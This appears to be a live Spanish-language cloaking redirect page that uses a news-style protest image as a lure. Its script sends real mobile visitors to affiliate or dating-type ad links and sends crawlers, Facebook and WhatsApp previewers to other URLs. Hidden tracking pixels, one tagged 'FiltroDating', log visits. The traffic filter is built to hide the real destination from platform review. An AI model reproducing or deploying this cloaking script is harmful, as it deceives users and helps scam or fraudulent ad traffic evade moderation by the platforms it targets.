<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirigiendo...</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    img {
      max-width: 100%;
      height: auto;
    }
  </style>
</head>
<body>

  <!-- Imagen visible mientras se filtra tráfico -->
  <img src="https://i.ibb.co/YBFqXTPJ/Protesta-con-barricada-ardiente-en-Hait.png" alt="Redireccionando...">

  <script>
    // Lista de enlaces limpios y secundarios
    const cleanLinks = [
      "https://www.carmovethermal.space/?sl=5951158-e44f2&pub_click_id={External_ID_from_traffic_source}&site={subID}&pub_sub_id={sub_subID}",
      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
    ];

    const dirtyLinks = [
      "https://www.profitableratecpm.com/tt8k7succ?key=16da75e3921e95e74ba03df4724376b0",
      "https://www.facebook.com/profile.php?id=61557594643465"
    ];

    // Filtros básicos
    const isBot = /bot|crawl|spider|facebook|whatsapp|preview|headless|phantom/i.test(navigator.userAgent);
    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const screenOK = window.innerWidth > 300 && window.innerHeight > 300;

    setTimeout(() => {
      if (!isBot && hasTouch && screenOK) {
        const cleanURL = cleanLinks[Math.floor(Math.random() * cleanLinks.length)];
        window.location.href = cleanURL;
      } else {
        const dirtyURL = dirtyLinks[Math.floor(Math.random() * dirtyLinks.length)];
        window.location.href = dirtyURL;
      }
    }, 3000);
  </script>
 <div style="visibility:hidden">
    <center>
      <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
    </center>
  </div>
  <!-- Pixel invisible -->
  <div style="visibility:hidden">
    <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=FiltroDating" style="display:none">
  </div>

</body>
</html>
